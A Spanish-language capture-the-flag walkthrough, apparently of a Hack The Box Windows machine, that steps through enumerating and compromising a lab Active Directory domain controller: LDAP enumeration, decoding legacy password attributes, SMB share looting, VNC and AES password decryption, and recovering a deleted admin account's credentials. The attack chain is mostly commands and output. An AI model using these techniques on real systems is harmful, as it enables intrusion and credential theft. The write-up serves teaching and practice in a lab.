@@ -1,0 +1,462 @@
+Cascade Windows Medium
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-17 13:03:10Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49165/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-09-17T13:04:01
+|_  start_date: 2024-09-17T12:57:01
+| smb2-security-mode: 
+|   2:1:0: 
+|_    Message signing enabled and required
+
+
+smbclient -L \\\\10.129.x.x
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.129.x.x failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+Se puede conectar anonimamente pero no se puede listar
+
+despues de instalar con pip la dependencia seguimos
+
+sudo apt-get update
+sudo apt-get install libsasl2-dev python3-dev libldap2-dev libssl-dev
+
+pip install python-ldap
+
+python windapsearch.py -U --full --dc-ip 10.129.x.x
+
+Dejo en ldapsearch los usuarios obtenidos
+
+bueno en el archivo tenemos passwords legacys en este cambios
+sAMAccountName: r.thompson
+cascadeLegacyPwd: clk0bjVldmE=
+
+en base64 es rY4n5eva
+
+No tenemos permisos para abrir una shell
+
+crackmapexec smb 10.129.x.x -u r.thompson -p rY4n5eva
+SMB         10.129.x.x  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.129.x.x  445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
+
+smbmap -H 10.129.x.x -u r.thompson -p rY4n5eva
+[+] IP: 10.129.x.x:445	Name: cascade.htb                                       
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	Audit$                                            	NO ACCESS	
+	C$                                                	NO ACCESS	Default share
+	Data                                              	READ ONLY	
+	IPC$                                              	NO ACCESS	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+	print$                                            	READ ONLY	Printer Drivers
+	SYSVOL                                            	READ ONLY	Logon server share 
+
+Y tenemos permisos en Data de lectura
+
+smbclient \\\\10.129.x.x\\Data -U r.thompson --password 'rY4n5eva'
+
+después de ver que lo que quiero descargar está en It
+
+smbclient \\\\10.129.x.x\\Data -U r.thompson --password 'rY4n5eva' -Tc allfiles.tar /IT/
+
+tar xfv allfiles.tar
+./IT/Email Archives/
+./IT/LogonAudit/
+./IT/Logs/
+./IT/Temp/
+./IT/Email Archives/Meeting_Notes_June_2018.html
+./IT/Logs/Ark AD Recycle Bin/
+./IT/Logs/DCs/
+./IT/Temp/r.thompson/
+./IT/Temp/s.smith/
+./IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log
+./IT/Logs/DCs/dcdiag.log
+./IT/Temp/s.smith/VNC Install.reg
+
+ya tengo una copia de los archivos en mi pc
+
+En el mail vemos que hay una cuenta llamada TempAdmin con el mismo password que admin
+
+En el resto de archivos vemos que el usuario TempAdmin acabó en la papelera
+8/12/2018 12:22	[MAIN_THREAD]	Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
+8/12/2018 12:22	[MAIN_THREAD]	Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+
+la carpeta de s.mith por ultimo nos deja un password
+
+"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+
+intentando pasarlo a ascii no nos da nada que podemos usar
+
+Con esta tool podemos desencriptar el pass
+
+https://github.com/jeroennijhof/vncpwd
+
+una vez compilado con gcc
+
+echo '6bcf2a4b6e5aca0f' | xxd -r -p > pass
+
+/opt/vncpwd/vncpwd pass
+Password: sT333ve2
+
+el password es sT333ve2
+
+evil-winrm -i 10.129.x.x -u s.smith -p sT333ve2
+
+y tenemos el flag de user
+
+..........
+
+Bueno ahora empieza la parte de AD
+
+Get-ADUser -identity s.smith -properties *
+
+
+
+AccountExpirationDate              :
+accountExpires                     : 9223372036854775807
+AccountLockoutTime                 :
+AccountNotDelegated                : False
+AllowReversiblePasswordEncryption  : False
+BadLogonCount                      : 0
+badPasswordTime                    : 132247275952778272
+badPwdCount                        : 0
+CannotChangePassword               : True
+CanonicalName                      : cascade.local/UK/Users/Steve Smith
+Certificates                       : {}
+City                               :
+CN                                 : Steve Smith
+codePage                           : 0
+Company                            :
+Country                            :
+countryCode                        : 0
+Created                            : 1/9/2020 6:08:13 PM
+createTimeStamp                    : 1/9/2020 6:08:13 PM
+Deleted                            :
+Department                         :
+Description                        :
+DisplayName                        : Steve Smith
+DistinguishedName                  : CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local
+Division                           :
+DoesNotRequirePreAuth              : False
+dSCorePropagationData              : {1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM, 1/13/2020 4:36:28 PM, 1/9/2020 6:08:13 PM...}
+EmailAddress                       :
+EmployeeID                         :
+EmployeeNumber                     :
+Enabled                            : True
+Fax                                :
+GivenName                          : Steve
+HomeDirectory                      :
+HomedirRequired                    : False
+HomeDrive                          :
+HomePage                           :
+HomePhone                          :
+Initials                           :
+instanceType                       : 4
+isDeleted                          :
+LastBadPasswordAttempt             : 1/28/2020 11:26:35 PM
+LastKnownParent                    :
+lastLogoff                         : 0
+lastLogon                          : 132247275990842339
+LastLogonDate                      : 9/17/2024 2:44:00 PM
+lastLogonTimestamp                 : 133710542404645934
+LockedOut                          : False
+logonCount                         : 16
+LogonWorkstations                  :
+Manager                            :
+MemberOf                           : {CN=Audit Share,OU=Groups,OU=UK,DC=cascade,DC=local, CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local, CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local}
+MNSLogonAccount                    : False
+MobilePhone                        :
+Modified                           : 9/17/2024 2:44:00 PM
+modifyTimeStamp                    : 9/17/2024 2:44:00 PM
+msDS-User-Account-Control-Computed : 0
+Name                               : Steve Smith
+nTSecurityDescriptor               : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                     : CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
+ObjectClass                        : user
+ObjectGUID                         : 38ebd9df-c4f7-4d00-9a9f-f503432ffa7d
+objectSid                          : S-1-5-21-3332504370-1206983947-1165150453-1107
+Office                             :
+OfficePhone                        :
+Organization                       :
+OtherName                          :
+PasswordExpired                    : False
+PasswordLastSet                    : 1/28/2020 7:58:05 PM
+PasswordNeverExpires               : True
+PasswordNotRequired                : False
+POBox                              :
+PostalCode                         :
+PrimaryGroup                       : CN=Domain Users,CN=Users,DC=cascade,DC=local
+primaryGroupID                     : 513
+ProfilePath                        :
+ProtectedFromAccidentalDeletion    : False
+pwdLastSet                         : 132247150854857364
+SamAccountName                     : s.smith
+sAMAccountType                     : 805306368
+ScriptPath                         : MapAuditDrive.vbs
+sDRightsEffective                  : 0
+ServicePrincipalNames              : {}
+SID                                : S-1-5-21-3332504370-1206983947-1165150453-1107
+SIDHistory                         : {}
+SmartcardLogonRequired             : False
+sn                                 : Smith
+State                              :
+StreetAddress                      :
+Surname                            : Smith
+Title                              :
+TrustedForDelegation               : False
+TrustedToAuthForDelegation         : False
+UseDESKeyOnly                      : False
+userAccountControl                 : 66048
+userCertificate                    : {}
+UserPrincipalName                  : s.smith@cascade.local
+uSNChanged                         : 344271
+uSNCreated                         : 16404
+whenChanged                        : 9/17/2024 2:44:00 PM
+whenCreated                        : 1/9/2020 6:08:13 PM
+
+
+Cada vez que iniciamos sesión con smith se ejecuta un script
+
+smbclient \\\\10.129.x.x\\NETLOGON -U s.smith --password sT333ve2
+
+en netlogon hay 2 scripts
+
+strDriveLetter = "F:"
+strRemotePath = "\\CASC-DC1\Audit$"
+
+pues queremos ver Audit
+
+smbclient \\\\10.129.x.x\\Audit -U s.smith --password sT333ve2
+
+smbclient \\\\10.129.x.x\\Audit$ -U s.smith --password sT333ve2
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed Jan 29 19:01:26 2020
+  ..                                  D        0  Wed Jan 29 19:01:26 2020
+  CascAudit.exe                      An    13312  Tue Jan 28 22:46:51 2020
+  CascCrypto.dll                     An    12288  Wed Jan 29 19:00:20 2020
+  DB                                  D        0  Tue Jan 28 22:40:59 2020
+  RunAudit.bat                        A       45  Wed Jan 29 00:29:47 2020
+  System.Data.SQLite.dll              A   363520  Sun Oct 27 07:38:36 2019
+  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 07:38:38 2019
+  x64                                 D        0  Sun Jan 26 23:25:27 2020
+  x86                                 D        0  Sun Jan 26 23:25:27 2020
+
+  cat RunAudit.bat
+───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: RunAudit.bat
+───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
+
+smb: \DB\> ls
+  .                                   D        0  Tue Jan 28 22:40:59 2020
+  ..                                  D        0  Tue Jan 28 22:40:59 2020
+  Audit.db                           An    24576  Tue Jan 28 22:39:24 2020
+
+		6553343 blocks of size 4096. 1627021 blocks available
+smb: \DB\> get Audit.db
+
+Por ultimo cogemos la bd
+
+instalamos un gestor de bbdd
+
+sudo snap install sqlitebrowser
+
+sqlitebrowser Audit.db
+
+Dentro tendriamos
+
+ArkSvc	BQO5l5Kj9MdErXx6Q6AGOw==
+
+y algunos usuarios borrador
+
+finalmente nos descargamos todos Audit porque necesitamso el ProgramData
+
+smbclient \\\\10.129.x.x\\Audit$ -U s.smith --password sT333ve2 -Tc soft.tar /
+tar xfv soft.tar
+./CascAudit.exe
+./CascCrypto.dll
+./DB/
+./RunAudit.bat
+./System.Data.SQLite.dll
+./System.Data.SQLite.EF6.dll
+./x64/
+./x86/
+./DB/Audit.db
+./x64/SQLite.Interop.dll
+./x86/SQLite.Interop.dll
+
+me lo paso a mi máquina windows y abro dotpeek
+
+using (SQLiteCommand sqLiteCommand = new SQLiteCommand("SELECT * FROM LDAP", connection))
+            {
+              using (SQLiteDataReader sqLiteDataReader = sqLiteCommand.ExecuteReader())
+              {
+                sqLiteDataReader.Read();
+                empty1 = Conversions.ToString(sqLiteDataReader["Uname"]);
+                empty2 = Conversions.ToString(sqLiteDataReader["Domain"]);
+                string EncryptedString = Conversions.ToString(sqLiteDataReader["Pwd"]);
+                try
+                {
+                  str = Crypto.DecryptString(EncryptedString, "c4scadek3y654321");
+                }
+                catch (Exception ex)
+                {
+                  ProjectData.SetProjectError(ex);
+                  Console.WriteLine("Error decrypting password: " + ex.Message);
+                  ProjectData.ClearProjectError();
+                  return;
+                }
+              }
+
+sencillo ya tenemos la clave para desencriptar el password
+
+vale en cyberchef me falta el IV
+
+sencillamente revisando el dll está allí
+
+public class Crypto
+  {
+    public const string DefaultIV = "1tdyjCbY1Ix49842";
+
+
+Obtenemos la clave w3lc0meFr31nd
+
+ArkSvc:w3lc0meFr31nd
+
+evil-winrm -i 10.129.x.x -u ArkSvc -p w3lc0meFr31nd
+
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name      SID
+============== ==============================================
+cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                            Attributes
+=========================================== ================ ============================================== ===============================================================
+Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+En este punto tenemos que volver a buscar el usuario admin que se habia borradod de la papelera ya que este usuario si puede acceder a la Recycle Bin
+
+Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects
+
+Deleted           : True
+DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+Name              : TempAdmin
+                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+ObjectClass       : user
+ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
+
+Get-ADObject -ldapfilter "(&(objectclass=user)(DisplayName=TempAdmin) (isDeleted=TRUE))" -IncludeDeletedObjects -Properties *
+
+accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
+CN                              : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+codePage                        : 0
+countryCode                     : 0
+Created                         : 1/27/2020 3:23:08 AM
+createTimeStamp                 : 1/27/2020 3:23:08 AM
+Deleted                         : True
+Description                     :
+DisplayName                     : TempAdmin
+DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
+givenName                       : TempAdmin
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
+lastLogoff                      : 0
+lastLogon                       : 0
+logonCount                      : 0
+Modified                        : 1/27/2020 3:24:34 AM
+modifyTimeStamp                 : 1/27/2020 3:24:34 AM
+msDS-LastKnownRDN               : TempAdmin
+Name                            : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : user
+ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
+objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
+primaryGroupID                  : 513
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 132245689883479503
+sAMAccountName                  : TempAdmin
+sDRightsEffective               : 0
+userAccountControl              : 66048
+userPrincipalName               : TempAdmin@cascade.local
+uSNChanged                      : 237705
+uSNCreated                      : 237695
+whenChanged                     : 1/27/2020 3:24:34 AM
+whenCreated                     : 1/27/2020 3:23:08 AM
+
+La parte interesante es:
+
+cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
+
+Admin:baCT3r1aN00dles
+
+evil-winrm -i 10.129.x.x -u Administrator -p baCT3r1aN00dles
+
+
+Y ya tenemos la flag de root, bastante sencilla esta máquina
